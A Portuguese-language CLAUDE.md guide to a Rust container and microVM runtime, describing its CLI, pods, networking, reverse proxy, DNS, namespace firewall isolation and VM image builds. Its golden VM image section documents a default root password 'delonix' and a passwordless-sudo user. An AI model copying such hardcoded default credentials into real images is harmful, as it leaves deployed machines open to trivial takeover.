# Delonix Runtime — guia do projeto (CLAUDE.md)

Motor de **containers e microVMs daemonless, rootless-first, kernel-native, em Rust**.
Repositório **público** (`angolardevops/delonix-runtime`, Apache-2.0) — extraído do monorepo
privado `delonix-paas` (ver [README.md](README.md) para a arquitectura dos 8 crates).

## Comandos

```bash
cargo build --workspace               # tudo
cargo test  --workspace               # testes
cargo build -p delonix-runtime-bin    # a CLI `delonix` (ver secção "CLI" abaixo)
```

## CLI (`delonix`)

O binário `delonix` (crate `delonix-runtime-bin`) é a CLI opensource completa deste motor —
homóloga ao Docker, distinta do `delonix`/`delonixctl` privados do `delonix-paas` (outro
repo/branch/remote, não afectados por nada aqui). Comandos agrupados semanticamente em vez de
uma lista plana, um módulo por grupo em `crates/delonix-runtime-bin/src/cmd/`:

- `delonix container` — run/ps/stop/rm/exec/logs/**update**/**describe**. **Nome default
  angolano**: sem `--name`, o container chama-se `<rei>-<lugar>-NN` (ex.:
  `njinga-benguela-07`) — listas partilhadas com o kind-mode em `cmd/names.rs`;
  DETERMINÍSTICO do id (as 2 passagens do re-exec de `--net` convergem sem transporte),
  colisão avança para a próxima combinação, `dlx-<id>` só como último recurso. `run` aceita `-v/--volume` (nomeado ou bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, testado e funcional) e
  `--net host|none|<rede>`. `host`/`none` — comportamento original, inalterado, testado. `--net
  <rede-custom>` **FUNCIONA em rootless** via o **re-exec `nsenter … ip netns exec`** (a nota
  antiga dizia que não existia — ESTAVA DESACTUALIZADA): `infra::attach_container` cria a netns
  NOMEADA do lado do holder e `reexec_into_netns` (`cmd/container.rs`) re-executa o binário via
  `infra::join_argv` (`nsenter -t <holder_pid> -U -m -n … ip netns exec <netns>`); a 2ª passagem
  corre com `RunSpec.inherit_userns` (suprime `CLONE_NEWNET`/`CLONE_NEWUSER`, herda os do holder —
  o processo passa a ter privilégio no userns do holder). O `RunSpec.join_netns` por `setns`
  (que falhava com "netns do pod indisponível") é **código morto** — abandonado a favor do
  re-exec. **`--pod <netns>`** usa o MESMO mecanismo para juntar N containers à netns partilhada
  de um pod (ver `delonix pod` / `kind: Pod` abaixo).
- `delonix pod` — **pods reais multi-container** (create/ls/describe/rm/logs). N containers
  partilham a **netns do pod** (mesmo IP, `localhost` entre si), como um Pod do k8s. `cmd/pod.rs`:
  cria uma netns SDN NOMEADA no holder (`pod-<nome>`, via `infra::attach_container`) e corre cada
  container com `--pod pod-<nome>` (o re-exec acima) + label `delonix.io/pod=<nome>`. **Membership
  sem store novo** — o estado deriva dos labels (`Store::list`), como `cluster`/`stack`. `rm`
  remove todos os membros + `detach` da netns. Reutiliza a normalização k8s→docker do
  `kind: Container` (`container::container_to_run_opts`/`pod_member_run_opts`); o `kind: Container`
  continua a aceitar SÓ 1 container (>1 → usa `kind: Pod`). **`kind: Pod`** no manifesto (mesmo
  schema `PodSpec`, N containers) + grupo `pods:` no `kind: Stack` + `--dry-run`. **Também tapa o
  gap do CRI root-mode** (`delonix-cri` chamava `delonix pod create/rm` que não existia).
  **Partilha de namespaces**: **netns** (Fase 1) + **IPC + UTS** (Fase 2) — o 1.º container segura
  o ipc/uts e os restantes juntam-se via `RunSpec.pod_infra_pid` (o `spawn` suprime
  `CLONE_NEWIPC/NEWUTS`, o `container_init` faz `setns` de `/proc/<pid>/ns/{ipc,uts}`); possível em
  rootless porque o re-exec `--pod` já os põe no userns do holder, onde o `setns` tem privilégio (a
  razão pela qual o `setns` antigo — `join_netns`, agora removido — falhava deixou de valer).
  **PID** (`shareProcessNamespace`, campo já no schema) é a Fase 3.
- `delonix image` — pull/ls/rm/export (bundle OCI para `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [contexto]` — único grupo com orquestração
  nova (as outras têm API pronta nas crates, isto é "ligar os fios"): sobe um container de
  trabalho (`sleep infinity`), corre cada `RUN` via `exec`, aplica `COPY` no rootfs em disco, e
  empacota com `ImageStore::commit_flat_rootfs` (rootless) ou `commit_upper`+`build_image` (root).
  **Só single-stage** — um Dockerfile com `FROM ... AS <nome>` seguido doutro `FROM` é recusado
  com erro claro; multi-stage fica para uma iteração seguinte (precisa de desenhar a passagem de
  rootfs entre estágios). **`Delonixfile`**: sem `-f`, `default_build_file` (`cmd/build.rs`)
  procura `<contexto>/Delonixfile` antes de `Dockerfile` — mesma gramática (`parse_dockerfile`
  já suporta as extensões Delonix `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK`
  independentemente do nome do ficheiro); `Delonixfile` é só o nome canónico por omissão.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 com `delonix_vm::VmConfig`.
- `delonix volumes` — create/ls/rm/inspect, wrapper fino sobre `VolumeStore`.
- `delonix network` — ls/create/rm/inspect. **Dois stores em paralelo, deliberado**:
  `NetworkStore` (registo declarativo rico — drivers bridge/macvlan/ipvlan/overlay) e
  `infra::{network_create_with,network_remove}` (plano físico do holder netns rootless). Para os
  drivers `bridge` E `overlay`, `network create` orquestra os dois em conjunto — o `overlay` sobe
  o plano físico no holder (bridge + uplink VXLAN `dlxvx<vni>` a masterizá-la + FDB dos pares +
  WireGuard se cifrado, ver `realize_overlay`/`infra::set_vxlan`), porque é realizável sem
  privilégio de host (vive todo no netns do holder). Provado ao vivo: `network create --driver
  overlay --vni 42 --peer …` cria o device VXLAN (`id 42 dstport 4789 nolearning`, master na
  bridge) e semeia o FDB com os pares — validado até à fronteira single-node (o forwarding
  inter-nó exige um 2.º nó real, não testável no sandbox). Já `macvlan`/`ipvlan` só ficam no
  `NetworkStore` e o `create` **AVISA alto** que a rede NÃO foi realizada (Realized=False,
  reason=DriverNotImplemented) em vez de fingir sucesso — o plano físico deles precisa de
  CAP_NET_ADMIN na init-netns do host, que o modelo rootless não tem.
- `delonix storage` — armazenamento de REDE (NFS/CIFS-SMB/WebDAV) montável como volume, estilo
  PersistentVolume do k8s. `create/ls/inspect/rm/apply` + `kind: Storage`. Uma pasta de um NAS
  (TrueNAS/Synology/Nextcloud) vira um volume nomeado que qualquer container monta com `-v <nome>:/x`.
  Por baixo é um volume do `delonix-volume` com driver de rede (o `ensure_mounted` monta via
  `mount -t nfs|cifs|davfs`); a declaração amigável (server/share/credenciais) é traduzida no
  device/options por `storage::build_mount`. Password via cofre (`--password-secret` → chave
  `password` do segredo). Validado end-to-end com NFS real: um container LEU e ESCREVEU num volume de
  rede e a escrita chegou ao NAS (ver `examples/storage.yaml` + `examples/nas-vm-cloud-config.yaml`,
  a receita da VM Samba+NFS de validação). **Montar NFS/CIFS precisa de CAP_SYS_ADMIN** (root ou
  sessão privilegiada) — em rootless puro o `mount -t` falha claro.
- `delonix httproute` — ls/apply/rm do **reverse-proxy L7/HTTP** (`kind: HTTPRoute`). Ver a
  secção "Reverse-proxy L7" abaixo. **Não confundir** com `delonix ingress` (firewall L4 inbound).
- `delonix stack apply [-f delonix-manifest.yaml]` — ver secção "Manifesto/apply" abaixo.

## Output: `ls` estilo docker, `describe` estilo kubectl (`cmd/output.rs`)

Toda a formatação passa por `cmd/output.rs` — `Table` (mede as colunas pelo conteúdo real; antes
cada grupo tinha larguras hardcoded `{:<20}` e a tabela desalinhava assim que um nome as passava),
`Describe` (blocos `kubectl`-like) e `fmt_size`/`fmt_local`/`fmt_age`/`fmt_duration_secs`.
**Sem dependências novas** — não há `comfy-table`/`tabled`/`chrono` na árvore e não vale a pena
aumentar a superfície de supply-chain de um runtime de containers por um alinhador de colunas.

> **Excepção deliberada: `ratatui` (`delonix dash`).** O dashboard interactivo
> (`delonix dash` + `container/vm/network/storage/image dash`) usa `ratatui`
> (traz `crossterm`) — a única dependência de UI que quebra a regra acima, por
> decisão explícita do utilizador (queria um TUI estilo htop, não um snapshot).
> Está **confinada ao bin** (`delonix-runtime-bin`); os crates de motor
> continuam dep-limpos (`cargo tree -e normal` deles não a mostra). O modo
> `delonix dash --once` (snapshot de texto ANSI) não a usa em runtime. Registado
> aqui para a auditoria futura não a tratar como acidental — ver `cmd/dash.rs`.

- `container ls` tem as 7 colunas do `docker ps`. O `Up …` sai do `pid_starttime` do init e **não**
  do `created_unix`: um container criado ontem e reiniciado há 5 min mostraria "Up 1 day" — falso
  exactamente quando interessa (a depurar um crash-loop).
- `fmt_duration_secs` porta o `units.HumanDuration` do docker **à letra**, baldes incluídos (dias
  até às 2 semanas, semanas até aos 2 meses). É essa escolha de baldes — e não um caso especial —
  que impede o "1 weeks" que a primeira versão daqui imprimia.
- **`describe` é aditivo; os `inspect` ficam como estavam.** `describe` = humanos, `inspect` = JSON
  para scripts. É uma CLI pública: migrar `volumes/network inspect` de texto para JSON seria
  breaking change e não se fez.
- `stack describe` não inventa estado: o stack **não tem registo próprio**, por isso parte do
  manifesto e vai confirmar a presença de cada recurso ao store respectivo (mesma filosofia do
  `cluster ls`, que deriva das labels). Não faz drift-detection — isso é trabalho de orchestrator.

## Reconfiguração a quente (`delonix container update`)

`container update <id>` muda **portas, volumes, redes e limite de banda sem parar o container** —
o PID não muda. É a diferença de fundo para o docker (onde mudar uma porta obriga a recriar):
aqui o dataplane não pertence ao ciclo de vida do processo. Flags: `--publish-add/--publish-rm`,
`--volume-add/--volume-rm`, `--net-connect/--net-disconnect`, `--net-rate/--net-burst/
--net-rate-clear`. **Remoções correm antes das adições**, para `--publish-rm 8080 --publish-add
8080:9000` funcionar num só comando.

Isto ligou APIs do motor que existiam há muito e **nunca tiveram um único chamador** —
`mount_live`/`unmount_live`, `attach_extra_container`/`detach_extra_container`,
`set_net_rate`/`clear_net_rate`. Por nunca terem sido chamadas, tinham um bug que só apareceu
agora (ver abaixo).

**Persistência**: cada operação grava no registo assim que o dataplane confirma, uma a uma, via
`Store::update` (flock — o CRI é concorrente). Não há transacionalidade: se a terceira falhar, as
duas primeiras JÁ estão aplicadas no kernel e um registo escrito só no fim ficaria a mentir.

**Limitações conhecidas, por desenho**:
- `--net-connect`/`--net-rate` exigem `--net <rede>`: o veth e o shaping vivem no netns do holder,
  que o caminho slirp-por-container (`--net host/none`) não tem.
- `--publish-add` num container criado **sem `-p` e sem `--net <rede>`** é impossível: o
  api-socket do slirp só é aberto quando o `run` leva portas (`slirp_attach`). Erro explícito.

**BUG CORRIGIDO ao ligar isto** (`mount_live`/`unmount_live`): gatavam o `setns(user)` em
`container.userns`, mas esse campo diz se o container **criou** o seu userns — os do ingress
rootless **herdam** o do holder e ficam com `userns=false` apesar de estarem num userns diferente
do nosso. Sem o setns, o `unshare(NEWNS)` seguinte dava EPERM e **toda** a montagem a quente
falhava (código 124). É o mesmo bug que o `exec` já teve e corrigiu — passam a abrir sempre o ns
`user` e a deixar o skip-por-inode do `open_container_ns` decidir. Lição a reter: **`container.
userns` não é "está num userns diferente do meu"**; nunca o usar para essa pergunta.

## Manifesto/apply (`delonix-manifest.yaml`)

Manifesto declarativo multi-documento, ao estilo Kubernetes (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), para os 5 Kinds com grupo de CLI: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Parsing central em `cmd/manifest.rs` (`serde_yaml`, só neste binário —
não entra em nenhum crate de mecanismo). Cada grupo (`cmd/{network,volume,image,vm,
container}.rs`) tem um `spec` tipado próprio (`NetworkSpec`, `VolumeSpec`, ...) e uma função
`pub fn apply(docs: &[ManifestDoc])` que filtra o seu Kind e aplica.

**Aproximação ao k8s (4 fatias, todas em main).** (1) **`kind: Container` forma de Pod** —
`spec.containers[]` (k8s) com `env:[{name,value}]`/`ports:[{containerPort,hostPort}]`/`resources.
limits`/`securityContext`/`volumeMounts`+`volumes`, normalizado para o `RunOpts` interno
(`container::pod_to_run_opts`); v1 = 1 container (>1 erro), a forma PLANA continua (back-compat),
detetado por `spec.containers` presente. (2) **`kind: Stack`** agrupa recursos num só doc
(`spec.{networks,volumes,storage,secrets,images,vms,containers,ingress,egress,firewallPolicies,
httpRoutes,dependencies}`), **expandido em `manifest::load`** para os docs individuais em ordem de
dependência (herda a namespace) — o Stack não sobrevive ao load, tudo o resto (apply/ls/describe +
apply por-Kind) vê os filhos. (3) **`kind: Ingress` = Ingress L7 k8s** (ver secção do reverse-proxy;
firewall foi para `FirewallPolicy`). (4) **`stack apply --dry-run`** — `manifest::render_with_
defaults` faz round-trip do spec pelo struct tipado (materializa os `#[serde(default)]`) e imprime
o YAML completo sem aplicar (estilo `kubectl --dry-run=client -o yaml`). Cada grupo expõe um
`pub fn spec_with_defaults(doc) -> serde_yaml::Value` (round-trip pelo seu spec tipado, que tem
`Serialize`); cobre **todos os Kinds** — Network/Volume/Storage/Image/Dependency/Vm/HTTPRoute/
Ingress(k8s)/Egress/FirewallPolicy/Container (flat E Pod-shape, via `pod_spec_with_defaults`). Só
**`Secret`** fica no spec cru de propósito (não reformatar `stringData`). `FwDocSpec` ganhou o campo
`direction` (Option, `skip_serializing_if`) para o round-trip o preservar (o `apply` lê-o do
`doc.spec`). `Metadata`/`ManifestDoc` têm `Serialize` (+ `skip_serializing_if` nos campos vazios).

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — aplica só os
  documentos do Kind desse grupo (ignora os outros). Sem `-f`, usa `./delonix-manifest.yaml`
  (erro claro se não existir).
- **`delonix stack apply [-f ficheiro]`** — aplica TODOS os Kinds, por esta ordem (dependência
  por nome): Network → Volume → Image → Vm → Container. **Fail-fast, sem transacionalidade**: o
  que já foi aplicado antes de um erro FICA aplicado (sem rollback).
- **Semântica de `apply`: "garante presente", não um reconciliador.** Sem diffing/rollout/
  drift-detection contínua — isso é trabalho de um orchestrator com controllers (deliberadamente
  fora de escopo aqui; o equivalente privado, `delonix-orchestrator`, fica só no `delonix-paas`).
  Idempotência por Kind: `Network`/`Container` verificam existência por nome antes de criar
  (`store.get`/procura no `Store` por `c.name`); `Volume`/`Vm` já são idempotentes na própria API
  do crate (`VolumeStore::create*`, `delonix_vm::create`); `Image` com `spec.pull` é idempotente
  (`resolve_or_pull`), com `spec.build` reconstrói e substitui a tag a cada `apply` (não há cache
  de build). `kind: Container`'s `spec.detach` tem **default `true`** (diferente do CLI `run`,
  onde é `false`) — um `apply` em primeiro plano bloquearia à espera do processo terminar.
- Exemplo completo de manifesto e o mapeamento spec↔CLI: ver o doc-comment de
  `crates/delonix-runtime-bin/src/cmd/manifest.rs` e o plano desta sessão
  (`/home/walter/.claude/plans/mellow-cuddling-canyon.md`, mantido para referência histórica).

## Reverse-proxy L7 (`kind: HTTPRoute`)

Reverse-proxy HTTP/HTTPS declarativo **embutido**. Roteia por `Host` + prefixo de path para
containers backend. Módulos: `cmd/httproute.rs` (schema `HttpRouteSpec` + resolução + `apply`) e
`cmd/ingress_proxy.rs` (o proxy `hyper` + o ciclo de vida). Superfície: `delonix httproute
ls/apply/rm` + `kind: HTTPRoute` no `stack apply`.

**`kind: Ingress` = Ingress L7 estilo k8s (BREAKING v0.7.x).** Desde esta série, `kind: Ingress`
é a forma **networking.k8s.io/v1** (`spec.rules[].host` + `http.paths[].backend.service.{name,port.
number}`, `spec.tls[]`, `defaultBackend`, `ingressClassName`) e **compila para o mesmo proxy L7**
(`httproute::ingress_to_httproute`/`ingress_spec_of` → `HttpRouteSpec`; recolhido em
`parse_and_validate` a par do `HTTPRoute`). Limitações herdadas do HTTPRoute: **um só cert (sem
SNI)** — o 1.º `tls[]` decide selfSigned/secretRef; `pathType: Exact` é aceite mas tratado como
prefixo; portas nomeadas dão erro (usa `port.number`). **Migração**: o firewall L4 que ANTES vivia
em `kind: Ingress` passou para **`kind: FirewallPolicy` com `direction: ingress`** (já era alias);
`firewall::apply` deixou de tratar `Ingress` (só `Egress`/`FirewallPolicy`); `validate_graph` e o
drift-guard movidos em conformidade; `examples/firewall.yaml` migrado, `examples/ingress.yaml` é a
nova forma L7. A CLI `delonix ingress` (publish/allow/deny) **continua L4** — só o *Kind* do
manifesto mudou de significado.

- **O proxy é `hyper` puro** (server http1 + cliente `hyper-util` legacy), **confinado ao bin** —
  `hyper`/`hyper-util`/`tokio`/`tokio-rustls`/`rustls-pemfile`/`rcgen`/`bytes`/`http-body-util` são
  deps do `delonix-runtime-bin`; **já vinham na árvore** (transitivas via `delonix-cri`/`tonic`),
  logo **zero superfície de supply-chain nova** (excepto `rcgen`/`rustls-pemfile`, minúsculas). Os
  crates de motor continuam dep-limpos.
- **Onde corre:** um processo `delonix ingress-proxy` (subcomando OCULTO) lançado **dentro do netns
  do holder** (`infra::infra_join_argv` + `setsid` detached; o `nsenter` faz EXEC → PID estável e
  signalável do host). Aí alcança os backends por IP interno; as portas de entrada publicam-se no
  host via `slirp add_hostfwd` (o proxy escuta `0.0.0.0` e apanha o `SLIRP_IP` — o holder **não tem
  `input` chain**, logo sem DNAT). Infra persistente como o slirp/holder, só existe quando há um
  HTTPRoute — respeita o "daemonless".
- **Reload a quente (SIGHUP):** as rotas vivem numa tabela trocável (`Arc<RwLock<Arc<Vec<Route>>>>`);
  `httproute apply` num proxy vivo reescreve a config e envia SIGHUP → só as ROTAS recarregam (mesmo
  PID, sem downtime). **Listeners e TLS ficam FIXOS no arranque** — mudá-los exige `httproute rm` +
  apply (o apply avisa se detetar mudança de portas). É o substrato do auto-registo de containers.
- **TLS termina no proxy** (`tokio-rustls`, provider `ring`): `spec.tls.mode: selfSigned` (gera um
  cert multi-SAN com `rcgen` cobrindo todos os hosts) ou `secretRef` (lê `tls_crt`/`tls_key` — ou
  `tls.crt`/`tls.key` — de um `kind: Secret`). Limitação v1: **um só cert** (sem selecção por SNI).
- **Resolução:** `httproute::apply` corre por ÚLTIMO no `stack apply` (precisa dos containers já
  criados) e resolve cada `backend.service` → `ip:porta` do record. **Só backends com IP na SDN**
  (numa rede custom) servem — os de `--net host/none` não são alcançáveis pelo proxy; erro claro.
- **Ciclo de vida** (`ensure_running`/`stop`): idempotente (vivo → SIGHUP; morto → spawn + publish),
  com **guarda de identidade do PID** (`/proc/<pid>/cmdline` contém `ingress-proxy`, para um PID
  reciclado não levar SIGHUP/SIGTERM), confirmação de arranque (não declara "a servir" se o proxy
  caiu no bind) e publish idempotente. `httproute rm` mata o proxy + despublica.
- **Segurança:** `host`/`path`/`backend.service` passam por `valid_host`/`valid_path_prefix`/
  `valid_service` antes de qualquer uso; headers **hop-by-hop** (Connection/Transfer-Encoding/
  Upgrade/…) removidos nos dois sentidos (anti-smuggling); timeouts anti-slowloris (handshake TLS,
  header-read, backend→504). **WebSocket/upgrade ainda NÃO é tunelado** (follow-up).
- **Provado E2E** (container `httpd` real numa rede custom): `httproute apply` → proxy no holder →
  `curl host:<porta>` com `Host` header → backend; HTTPS com `curl -k` (TLS negociado, self-signed);
  re-apply recarrega por SIGHUP (mesmo PID); `httproute rm` mata e despublica. Ver `examples/httproute.yaml`.

**Auto-registo de containers (`container run --expose <porta>`) — FEITO.** Um container com
`--expose` é auto-registado no proxy L7 sob o FQDN interno `<nome>.<namespace>.delonix.internal`,
com reload a quente (SIGHUP), removido no `container rm`. A config final compõe-se de DUAS fontes
que **nunca se apagam**: **MANUAL** (`kind: HTTPRoute` → `set_manual`/`manual.json`) + **AUTO**
(`--expose` → `auto_register`/`auto.json`, read-modify-write sob **flock** contra lost-update).
`rebuild()` une as duas → `ensure_running` (ou `stop` se ficou tudo vazio). `httproute rm` limpa só
a parte MANUAL (as auto sobrevivem). As auto-rotas servem-se em **:8080** (não :80 — em rootless o
slirp não publica portas <1024). O `--expose` exige `--net <rede>` (avisa senão) e re-regista no
`start`. Provado E2E: `--expose` → `curl host:8080 -H 'Host: <fqdn>'` → container; múltiplas
auto-rotas + MANUAL coexistem no mesmo proxy. **Limitação**: adicionar uma auto-rota com o proxy JÁ
noutro listener não liga a porta nova (SIGHUP recarrega só rotas — herdado dos listeners-fixos).
Faz do Delonix um substituto do k8s (DNS+ingress) em ambientes pequenos.

## DNS interno / descoberta de serviço (`<nome>.<namespace>.delonix.internal`)

O DNS do holder (`infra::dns_server_main`/`dns_resolve`) resolve nomes de container/VM para o IP
da SDN — descoberta de serviço estilo k8s (CoreDNS), sem nada a configurar. Esquemas:

- **`<nome>`** (simples) e **`<nome>.delonix.io`** (legado) → resolvem o container por nome, em
  QUALQUER namespace (comportamento de sempre, preservado).
- **`<nome>.<namespace>.delonix.internal`** → resolve E **verifica a namespace** (isolamento também
  no DNS: resolver com a namespace errada dá **NXDOMAIN**). `parse_internal_name` (pura, testada)
  separa nome/namespace.
- **Anti-sequestro**: a divisão por namespace só se aplica ao sufixo `.delonix.internal` — um
  domínio EXTERNO (`api.github.com`) **nunca** é sequestrado por um container `api` na ns `github.com`;
  fica como nome-inteiro (não casa) e reencaminha.
- **Provado E2E**: `api.prod.delonix.internal` → IP correcto; `api` simples resolve; namespace
  errada → NXDOMAIN. É a fundação do **auto-registo** (cada container HTTP ganha FQDN + rota no
  proxy — próxima fatia).

## Alcançabilidade dirigida (`kind: Dependency` / `KnowDepends`)

`kind: Dependency` (alias `KnowDepends`) — comunicação **DIRIGIDA** entre containers, ao contrário
da `Network` (bidirecional). `spec: { from, to (escalar ou lista), ports?, proto? }`: `from`
alcança `to`, mas `to` não fica exposta aos outros containers da rede. Caso clássico: a app conhece
a DB, a DB não fica acessível aos outros apps de uma rede partilhada (`cmd/dependency.rs`).

- **Açúcar sobre o firewall L4 por-container** (zero dataplane novo): compila para, no `to`, ingress
  **default-deny** (protege) + um `allow` do IP do `from`. Reutiliza `ContainerFw`/`infra::
  apply_firewall` via `firewall::apply_container_ingress` (helper partilhado). Várias `Dependency`
  para o mesmo `to` **acumulam** os `allow`. O retorno da conversa flui porque a SDN é stateful.
- **Alias de Kind** `KnowDepends`→`Dependency` (`canonical_kind`). Grafo valida `from`/`to` como
  containers; `stack apply` corre-o após o firewall (precisa dos IPs). Ver `examples/dependency.yaml`.
- **Provado E2E**: rede aberta (app E other alcançam db) → após `Dependency app→db`, app OK e other
  BLOQUEADO (timeout).
- **Semântica v1 e limites**: garante "`to` protegido, só os `from` declarados o alcançam". O
  bloqueio do **sentido inverso** (`to` não INICIA para `from`) completa-se com **Namespaces**
  (isolamento default-deny universal — próxima fatia). Um `to` que seja simultaneamente alvo de um
  `kind: Ingress` explícito **e** de `Dependency` avisa (o Dependency é autoritativo e substitui a
  direção de entrada). Remover a `Dependency` **não** desprotege o `to` ("garante presente").

## Isolamento de namespace (`metadata.namespace` / `--namespace`)

Namespace lógico de **isolamento** (default `default`), estilo k8s: containers de namespaces
diferentes **não se alcançam** (mesmo na MESMA rede); só um `kind: Dependency` fura a fronteira,
e num só sentido. Superfície: `container run --namespace <ns>` + `metadata.namespace` no manifesto.
Núcleo em `ContainerFw.namespace` + `infra::fw_chain_body`/`ns_set_join`.

- **Modelo unificado por-container** (decisão de desenho — nftables `accept` não é terminal entre
  base chains, o que impede uma chain `nsdeny` separada de compor com o Dependency): o isolamento
  vive na chain dedicada de CADA container (first-match terminal). Um container fora do `default`
  ganha, na entrada: `ip saddr @dlxns_<ns> accept` (mesma namespace) + `ip saddr @dlxall ct state
  new drop` (dropa NOVAS ligações de containers de OUTRA namespace). O `ct new` isenta o retorno
  (established), e o `@dlxall` limita o drop a fontes-container (gateway/DNS/internet passam).
- **Sets nft**: `@dlxall` (todos os IPs de container) + `@dlxns_<hash>` por namespace, mantidos no
  `do_attach` (`ns_set_join`: remove o IP de qualquer `@dlxns` anterior → re-attach/mudança de ns
  corrige-se sem cleanup no detach). O membership é dinâmico — as regras `@set` avaliam a
  composição actual, sem re-aplicar a chain quando um peer entra.
- **Composição com Dependency/Ingress**: uma política EXPLÍCITA é autoritativa e substitui o
  default de namespace (`has_explicit_in` short-circuita as regras de namespace). Assim um
  `Dependency app→db` fura a parede (allow do IP do app na chain do db) e o **sentido inverso**
  db→app fica bloqueado pela regra de namespace do app — a garantia dirigida que o Dependency
  sozinho não dava.
- **Provado E2E** (bateria de isolação, 4 containers, 2 namespaces): same-ns → OPEN; cross-ns →
  BLOQUEADO (timeout); Dependency fura o cross-ns; sentido inverso bloqueado; retorno flui. O
  `container start` **re-aplica** a firewall persistida (o isolamento sobrevive ao reinício).
- **`default` = SDN aberta** (tudo na mesma namespace) → **comportamento inalterado** para quem não
  usa namespaces. Attach de `default` mantém a forma de 5 tokens do control-line (compat com um
  holder antigo num upgrade in-place; só attaches namespaced exigem o holder novo).
- **Limitações v1 (conhecidas)**: (1) o isolamento **não é reconstruído num respawn do holder** —
  os sets/chains recriam-se vazios e os containers vivos não se re-atacham sozinhos (reiniciar cada
  um repõe); (2) **pods (CRI) e VMs** ainda ficam em `default` (attach por caminhos distintos);
  (3) `default↔não-default` é **assimétrico** (o `default` é o namespace "público" — alcançável de
  dentro de qualquer namespace, mas não alcança para dentro delas). Fechar (1)/(2) é o próximo passo.

## Imagem VM dourada (`delonix image --vm`)

`delonix image --vm ls|pull|push|build` gere imagens VM à parte das imagens de container
(`ImageStore`) — um `.qcow2` solto + `.json` de metadados por imagem, em `<root>/vm-images/`
(`crates/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). Prepara o terreno para
`delonix cluster kubeadm` (secção "Cluster kubeadm" abaixo — já implementado): a imagem já vem
com `kubeadm`/`kubelet`/`kubectl` e o `delonix-cri` a correr como serviço systemd — **arrancar um
nó não faz nenhuma instalação**, só `kubeadm init`/`kubeadm join`.

- **`build`**: descarrega a cloud image Ubuntu (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cache em `<root>/vm-images/_base/`, valida contra `SHA256SUMS` — nunca aceita um
  download sem verificar), achata-a (`qemu-img convert`, sem depender de um backing-file local
  no artefacto final), e corre `virt-customize` com uma lista de passos construída em Rust por
  `k8s_customization_steps()` — **isto é o "100% parametrizado"**: `--extra-package`/
  `--extra-run` estendem sem tocar no código. Instala o repositório `pkgs.k8s.io` +
  `kubeadm`/`kubelet`/`kubectl`, desliga swap, carrega `overlay`/`br_netfilter` + sysctls
  exigidos pelo kubelet/CNI, injecta o binário `delonix-cri` (ver abaixo) + a unit systemd
  (`dist/delonix-cri.service`, `systemctl enable`), e cria a conta padrão pedida: `root`/senha
  `delonix`, utilizador `delonix:delonix` em `sudo` com `NOPASSWD`. cloud-init fica ACTIVO na
  imagem (o build só corre uma vez; o cloud-init do primeiro-boot de CADA VM continua a aplicar
  hostname/SSH-keys — ver `delonix vm create` abaixo). Configura também, em `/etc/bash.bashrc`
  (bash interactivo login E não-login — consola série e SSH), o **autocomplete + alias `k`**
  recomendado pela doc do Kubernetes: `source <(kubectl completion bash)` / `alias k=kubectl` /
  `complete -o default -F __start_kubectl k` / `source <(kubeadm completion bash)` (+ `crictl`),
  cada bloco guardado por `command -v` (inerte se faltar a ferramenta). Fica em
  `common_customization_steps` (partilhado pelos builds online E offline); só toma efeito na
  próxima build/publicação da golden (`vm-image.yml`).
- **Tamanho do artefacto (medido, golden 24.04: 2.38 GiB → 677 MiB, −72%)** — três passos, todos
  no fim do `build`, cada um com uma razão concreta:
  1. **`apt-get clean` + `rm -rf /var/lib/apt/lists/*`** (último `CustomizeOp`, DEPOIS do
     `--extra-run` do utilizador, que pode instalar mais pacotes). Media na golden: `/var/cache/apt`
     ~181 MiB + `/var/lib/apt/lists` ~186 MiB = **~367 MiB de lixo** que enchiam a raiz a **92%**
     (179 MiB livres — perigoso para um nó k8s: o kubelet despeja perto do limite). Depois: 77%,
     546 MiB livres. Fica em `k8s_customization_steps` e **não** em `k8s_recipes` — aquele catálogo
     é PARTILHADO com `cluster apply`, que prepara hosts VIVOS; limpar cache é preocupação do
     ARTEFACTO, não da preparação de um host.
  2. **`virt-sparsify --in-place`** — zera os blocos que a limpeza libertou (sem isto continuam a
     ocupar no qcow2). Best-effort: se falhar, o build segue (só perde tamanho).
  3. **`qemu-img convert -c -o compression_type=zstd`** — a cloud image da Ubuntu **vem comprimida**
     e o `convert` inicial (sem `-c`) descomprime-a; sem este passo o artefacto fica ~4x maior que
     a base (593 MiB → 2.38 GiB). **zstd e não o zlib por omissão**: comprime 5x mais rápido
     (10s vs 53s), fica menor (868 vs 894 MiB no mesmo input), e sobretudo **descomprime** muito
     mais rápido — importa porque a golden é o **backing file read-only** das VMs
     (`delonix_vm::create` faz um overlay qcow2 por VM), logo cada leitura do SO base passa pelo
     descompressor. Escapatória: `--no-compress`. Custo total: ~12s de build.
- **`--offline` (PREFERIR SEMPRE; validado 2026-07-17, build em 1m18s)** — obtém os `.deb` do k8s
  no **HOST** e corre o `virt-customize` com **`--no-network`**. O appliance nunca precisa de
  DHCP/DNS, o que **dispensa os workarounds de host** (passt/dhclient) que o caminho online
  exige — ver "Bloqueio de execução conhecido" abaixo. Validado com o `passt` ATIVO, sem tocar
  no host.
  - **Cadeia de confiança: a MESMA do apt, feita no host em vez do guest** — `InRelease`
    (clearsigned, verificado com `gpgv` contra a `Release.key` do repo, keyring TEMPORÁRIO —
    nunca toca no do utilizador) → SHA256 do índice `Packages` (declarado no InRelease assinado)
    → SHA256 de cada `.deb` (declarado no `Packages` autenticado). **Falha FECHADO** em qualquer
    passo — mesmo princípio do achado CRÍTICO nº3 da auditoria (`pull_oci_artifact` sem digest).
  - **Porque `dpkg -i` chega** (medido, não suposto): o fecho são só **4 `.deb` do repo k8s**
    (`kubeadm`/`kubectl`/`kubelet` + `kubernetes-cni`); as restantes deps do kubelet
    (`iptables`/`mount`/`util-linux`/`libc6`) **já vêm na cloud image**. Se alguma faltar, o
    `dpkg` falha ALTO — nunca deixa o guest meio-instalado.
  - **Armadilha (custou um build)**: `kubernetes-cni` tem versionamento PRÓPRIO (1.7.x), não
    segue o do k8s — o filtro `--k8s-version 1.34` só se aplica aos componentes core
    (`parse_packages_index`, parâmetro `versioned`). Há teste de regressão.
